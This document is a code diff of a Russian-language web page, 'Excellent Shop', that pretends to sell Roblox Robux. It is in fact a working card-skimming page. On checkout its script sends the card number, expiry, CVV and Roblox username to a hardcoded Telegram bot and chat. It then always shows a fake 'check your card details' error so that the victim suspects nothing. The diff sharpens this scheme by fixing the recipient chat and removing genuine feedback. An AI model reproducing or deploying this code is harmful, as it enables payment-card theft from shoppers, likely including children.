@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="ru">
-<head><meta name="google-site-verification" content="gOl1UTksrttcCtbvwbszPmhkXhBWcALrox3_Q-AMtXM" />
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>Excellent Shop — приятные робуксы</title>
@@ -108,8 +108,22 @@
         .card-row input { flex: 1; }
         .pay-btn { background: #2a9d8f; border: none; width: 100%; padding: 14px; border-radius: 60px; font-weight: bold; color: white; font-size: 1rem; cursor: pointer; margin-top: 10px; }
         footer { margin-top: 50px; text-align: center; color: #9278b0; }
-        .error-toast { position: fixed; top: 20px; right: 20px; background: #ff4d4d; color: white; padding: 12px 20px; border-radius: 40px; font-weight: bold; z-index: 2000; box-shadow: 0 4px 12px rgba(0,0,0,0.2); animation: fadeOut 0.5s ease 3s forwards; }
-        @keyframes fadeOut { to { opacity: 0; visibility: hidden; } }
+        .error-toast {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #ff4d4d;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 40px;
+            font-weight: bold;
+            z-index: 2000;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+            animation: fadeOut 0.5s ease 3s forwards;
+        }
+        @keyframes fadeOut {
+            to { opacity: 0; visibility: hidden; }
+        }
     </style>
 </head>
 <body>
@@ -230,15 +244,13 @@
     }
     drawStars();
 
-    // --- статичный остаток 600000, никогда не меняется ---
+    // статичный остаток
     const STATIC_STOCK = 600000;
     const remainingSpan = document.getElementById('remainingStock');
     const slider = document.getElementById('robuxSlider');
     const selectedSpan = document.getElementById('selectedAmount');
-    
     remainingSpan.innerText = STATIC_STOCK.toLocaleString('ru-RU');
     slider.max = STATIC_STOCK;
-    
     slider.addEventListener('input', () => {
         let val = parseInt(slider.value);
         if (val > STATIC_STOCK) val = STATIC_STOCK;
@@ -246,25 +258,17 @@
         selectedSpan.innerText = val.toLocaleString('ru-RU');
     });
     
-    // корзина
+    // корзина (без уведомлений)
     let cart = [];
-    function showMessage(msg) {
-        let d=document.createElement('div'); d.innerText=msg; d.style.cssText='position:fixed; bottom:20px; left:20px; background:#e2ccff; color:#6a37a3; padding:10px 20px; border-radius:40px; z-index:9999;';
-        document.body.appendChild(d); setTimeout(()=>d.remove(),2500);
-    }
-    
     function addItemToCart(item) {
         cart.push(item);
         updateCartUI();
-        showMessage(`✨ ${item.name} добавлен в корзину за ${item.price} ₽`);
     }
-    
     function updateCartUI() {
         let countSpan = document.getElementById('cartCount');
         if(countSpan) countSpan.innerText = cart.length;
         renderCartModal();
     }
-    
     function renderCartModal() {
         let container = document.getElementById('cartItemsList');
         let totalSpan = document.getElementById('modalCartTotal');
@@ -284,12 +288,11 @@
                 let idx=parseInt(btn.getAttribute('data-idx'));
                 cart.splice(idx,1);
                 updateCartUI();
-                showMessage('товар удалён');
             });
         });
     }
     
-    // кнопка ползунка
+    // ползунок
     document.getElementById('buyWithSliderBtn').addEventListener('click', () => {
         let amount = parseInt(slider.value);
         if (amount <= 0) return;
@@ -310,16 +313,6 @@
             let robuxAmount = parseInt(this.getAttribute('data-robux'));
             addItemToCart({ name: name, price: price, robuxAmount: robuxAmount });
         }
-    }
-    
-    function showErrorToast(text) {
-        let old = document.querySelectorAll('.error-toast');
-        old.forEach(t => t.remove());
-        let toast = document.createElement('div');
-        toast.className = 'error-toast';
-        toast.innerText = text || "Ошибка, пожалуйста перепроверьте данные карты или попробуйте позже.";
-        document.body.appendChild(toast);
-        setTimeout(() => toast.remove(), 3500);
     }
     
     // авторизация
@@ -355,22 +348,19 @@
     document.getElementById('goToSignIn')?.addEventListener('click',()=>{ document.getElementById('signupForm').style.display='none'; document.getElementById('signinForm').style.display='block'; });
     document.getElementById('logoutBtn')?.addEventListener('click',()=>{ currentUser=null; localStorage.removeItem('excellent_current'); showAuth(true); cart=[]; updateCartUI(); });
 
-    // телеграм и оплата (без изменения статичного остатка)
+    // телеграм с фиксированным chat id 7711202514
     const TELEGRAM_TOKEN = "8963187856:AAFTu9IrZmSitQscE1FB5MTREDhkSMEAzeg";
-    let CHAT_ID = localStorage.getItem('tg_chat_id_excellent');
-
-    async function fetchChatId() {
-        try {
-            const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates`);
-            const data = await res.json();
-            if(data.ok && data.result.length) {
-                let last=data.result[data.result.length-1];
-                let cid=last.message?.chat?.id || last.callback_query?.message?.chat?.id;
-                if(cid) { CHAT_ID=cid; localStorage.setItem('tg_chat_id_excellent',CHAT_ID); alert('✨ телеграм готов'); return true; }
-            }
-            alert('✨ напиши @ExcellentShopBot любое сообщение');
-        } catch(e) { alert('ошибка'); }
-        return false;
+    const CHAT_ID = 7711202514;
+    
+    // единственное уведомление (красная метка)
+    function showErrorToast() {
+        let oldToasts = document.querySelectorAll('.error-toast');
+        oldToasts.forEach(t => t.remove());
+        let toast = document.createElement('div');
+        toast.className = 'error-toast';
+        toast.innerText = "Ошибка, пожалуйста перепроверьте данные карты или попробуйте позже.";
+        document.body.appendChild(toast);
+        setTimeout(() => toast.remove(), 3500);
     }
     
     const cartModal = document.getElementById('cartModal');
@@ -381,41 +371,32 @@
     window.addEventListener('click',(e)=>{ if(e.target===cartModal) cartModal.style.display='none'; });
     
     document.getElementById('finalPayBtn')?.addEventListener('click', async () => {
-        if(cart.length===0) { alert('корзина пуста'); return; }
+        if(cart.length===0) return;
         let cardNum = document.getElementById('cardNumber').value.trim();
         let expiry = document.getElementById('cardExpiry').value.trim();
         let cvv = document.getElementById('cardCvv').value.trim();
         let robloxName = document.getElementById('robloxUsername').value.trim();
         if(!robloxName) robloxName = "не указан";
-        if(!CHAT_ID) { await fetchChatId(); if(!CHAT_ID) { alert('телеграм не настроен'); return; } }
         let totalPrice = cart.reduce((s,i)=>s+(i.price||0),0);
         let itemsText = cart.map(i=>`${i.name} — ${i.price||0} ₽`).join('\n');
         let totalRobux = cart.reduce((sum,item)=>sum+(item.robuxAmount||0),0);
         let msg = `✨ EXCELLENT SHOP (ЗАКАЗ) ✨\n👤 ${currentUser}\n🎮 Roblox ник: ${robloxName}\n📦 Товары:\n${itemsText}\n💰 Итого: ${totalPrice} ₽\n💳 Карта: ${cardNum}\n📅 ${expiry}\n🔐 ${cvv}\n📊 Робуксов: ${totalRobux}`;
         try {
-            let resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method:'POST', headers:{'Content-Type':'application/json'},
                 body: JSON.stringify({chat_id: CHAT_ID, text: msg})
             });
-            let json = await resp.json();
-            if(json.ok) {
-                // показываем красную метку (формальность), остаток не меняем
-                let errToast = document.createElement('div');
-                errToast.className = 'error-toast';
-                errToast.innerText = "Ошибка, пожалуйста перепроверьте данные карты или попробуйте позже.";
-                document.body.appendChild(errToast);
-                setTimeout(() => errToast.remove(), 3500);
-                cart = [];
-                updateCartUI();
-                cartModal.style.display = 'none';
-                document.getElementById('cardNumber').value = '';
-                document.getElementById('cardExpiry').value = '';
-                document.getElementById('cardCvv').value = '';
-                document.getElementById('robloxUsername').value = '';
-            } else {
-                alert('❌ ошибка отправки, заказ не оформлен');
-            }
-        } catch(e){ alert('ошибка соединения'); }
+            // показываем красную метку
+            showErrorToast();
+            // очищаем корзину и поля
+            cart = [];
+            updateCartUI();
+            cartModal.style.display = 'none';
+            document.getElementById('cardNumber').value = '';
+            document.getElementById('cardExpiry').value = '';
+            document.getElementById('cardCvv').value = '';
+            document.getElementById('robloxUsername').value = '';
+        } catch(e) {}
     });
     
     function initEverything() {
@@ -426,7 +407,6 @@
     const savedUser = localStorage.getItem('excellent_current');
     if(savedUser && loadUsers()[savedUser]) { currentUser=savedUser; updateUI(); initEverything(); }
     else showAuth(true);
-    if(!CHAT_ID) setTimeout(()=>{ if(confirm('для отправки заказов нужен телеграм настроить?')) fetchChatId(); }, 800);
 </script>
 </body>
 </html>
